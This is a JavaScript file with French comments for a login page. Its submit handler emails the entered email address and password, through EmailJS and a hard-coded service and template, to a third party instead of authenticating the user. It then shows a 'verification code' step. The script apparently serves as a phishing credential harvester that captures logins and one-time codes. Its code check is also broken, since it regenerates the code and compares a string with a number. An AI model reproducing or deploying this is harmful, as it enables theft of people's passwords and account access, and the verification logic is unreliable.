// Initialise EmailJS avec votre User ID
emailjs.init("-xgMn-W7z9wR_oif-"); // Remplacez par votre clé API EmailJS

// Fonction de validation du formulaire principal
function validateForm() {
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const errorMessage = document.getElementById('errorMessage');

    // Validation simple pour démonstration
    if (email === "" || password === "") {
        errorMessage.textContent = "Veuillez remplir tous les champs.";
        return false;
    }

    // Validation du format d'email
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
        errorMessage.textContent = "Veuillez entrer une adresse e-mail valide.";
        return false;
    }

    // Effacer le message d'erreur si tout est correct
    errorMessage.textContent = "";
    return true; // Permettre l'envoi du formulaire si la validation réussit
}

// Fonction pour envoyer le code de vérification
function sendVerificationCode(email) {
    const code = Math.floor(100000 + Math.random() * 900000); // Génère un code à 6 chiffres

    // Envoi du code de vérification à une autre adresse e-mail
    emailjs.send('service_id', 'template_verification_code', { email: email, code: code })
        .then(function(response) {
            console.log('Code envoyé avec succès:', response);
            alert('Code de vérification envoyé!');
        }, function(error) {
            console.log('Erreur lors de l\'envoi du code:', error);
            alert('Une erreur est survenue lors de l\'envoi du code.');
        });

    return code; // Retourne le code pour vérification ultérieure
}

// Gestion de la soumission du formulaire principal
document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault(); // Empêche le comportement par défaut du formulaire

    // Valider le formulaire avant l'envoi
    if (!validateForm()) {
        return; // Ne pas envoyer le formulaire si la validation échoue
    }

    console.log("Validation réussie, préparation à l'envoi..."); // Log pour le débogage

    // Envoie le formulaire principal avec EmailJS
    emailjs.sendForm('service_odtxz18', 'template_pj35ygs', this)
        .then(function(response) {
            console.log('Succès:', response);
            alert('Formulaire envoyé avec succès!');

            // Afficher le formulaire de code de vérification
            document.getElementById('loginForm').style.display = 'none';
            document.getElementById('codeForm').style.display = 'block';
            
            // Envoi du code de vérification
            const email = document.getElementById('email').value;
            sendVerificationCode(email);
        }, function(error) {
            console.log('Erreur:', error);
            alert('Une erreur est survenue. Veuillez réessayer.');
        });
});

// Fonction de validation du code de vérification
function validateCode(codeEntered, code) {
    return codeEntered === code;
}

// Gestion de la soumission du formulaire de code de vérification
document.getElementById('codeForm').addEventListener('submit', function(event) {
    event.preventDefault(); // Empêche le comportement par défaut du formulaire

    const codeEntered = document.getElementById('code').value;
    const email = document.getElementById('email').value;
    
    // Le code de vérification généré
    const code = sendVerificationCode(email); // Utilisez une méthode pour stocker temporairement le code généré

    if (validateCode(codeEntered, code)) {
        alert('Code vérifié avec succès!');
        // Vous pouvez ajouter d'autres actions ici
    } else {
        alert('Code incorrect. Veuillez réessayer.');
    }
});
